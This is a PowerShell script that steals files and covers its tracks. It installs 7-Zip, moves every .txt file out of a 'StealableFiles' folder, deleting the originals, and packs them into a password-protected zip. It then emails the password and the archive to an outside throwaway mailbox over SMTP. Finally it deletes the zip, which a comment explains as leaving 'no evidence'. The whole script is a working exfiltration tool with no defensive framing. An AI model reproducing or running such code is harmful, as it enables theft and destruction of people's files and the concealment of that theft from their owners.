#Install 7zip to zip files

$workdir = "c:\installer\"

If (Test-Path -Path $workdir -PathType Container)
{ Write-Host "$workdir already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $workdir  -ItemType directory }

#Download the installer

$source = "http://www.7-zip.org/a/7z1604-x64.msi"
$destination = "$workdir\7-Zip.msi"


if (Get-Command 'Invoke-Webrequest')
{
     Invoke-WebRequest $source -OutFile $destination
}
else
{
    $WebClient = New-Object System.Net.WebClient
    $webclient.DownloadFile($source, $destination)
}

Invoke-WebRequest $source -OutFile $destination 

#Start the installation

msiexec.exe /i "$workdir\7-Zip.msi" /qb

#Wait 20 Seconds for the installation to finish

Start-Sleep -s 5

#Remove the installer

rm -Force $workdir\7*



#Set source and destination of files to copy and store

$Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
$Destination = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles"

#Copy all files with certain extension and delete them in the source location

$cp = robocopy /mov $Source $Destination *.txt /s

#Generate a random 8 character password

[Reflection.Assembly]::LoadWithPartialName("System.Web")
$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)

#Set source for 7zip exe (usually the same path in most basic computers)

$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"

#Zip destination folder with the random password previously generated

$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

#Delete the destination folder

$del = Remove-Item $Destination -Force -Recurse



#Send password for files to your e-mail

$email = "zswyjkom@pokemail.net"

$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
$Body =  $randomPassword
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Mailer.send($Msg)
$Msg.Dispose()
$Mailer.Dispose()

#Send zip folder to your e-mail

#Start-Sleep -s 15
$ZipFolder = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles.zip"
$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()

#Delete the zip file (leave no evidence)

#Start-Sleep -s 15
$del = Remove-Item $ZipFolder -Force -Recurse
